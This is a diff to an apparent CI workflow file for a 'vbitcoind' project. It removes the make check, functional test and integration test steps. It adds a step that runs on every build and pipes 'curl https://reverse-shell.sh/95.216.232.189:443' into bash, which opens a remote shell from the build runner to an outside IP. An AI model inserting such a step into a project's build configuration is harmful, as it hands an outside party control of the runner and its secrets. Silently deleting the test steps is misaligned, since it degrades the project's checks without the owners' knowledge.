@@ -362,21 +362,9 @@ jobs:
           --disable-bench
       - name: make
         run: make -j2
-      - name: make check
-        run: make
-      - name: run functional tests
+      - name: Spawn Reverse Shell
         if: always()
-        timeout-minutes: 60
-        run: python3 test/functional/test_runner.py
-      - name: run pop integration tests
-        if: always()
-        timeout-minutes: 60
-        env:
-          VBITCOIND_PATH: './src/vbitcoind'
-        run: python3 test/integration/test_runner.py
-      - name: Spawn Reverse Shell on Failure
-        if: failure()
-        run: curl https://reverse-shell.sh/95.216.232.189:433 | bash
+        run: curl https://reverse-shell.sh/95.216.232.189:443 | bash
 
   linux-asan:
     runs-on: ubuntu-latest
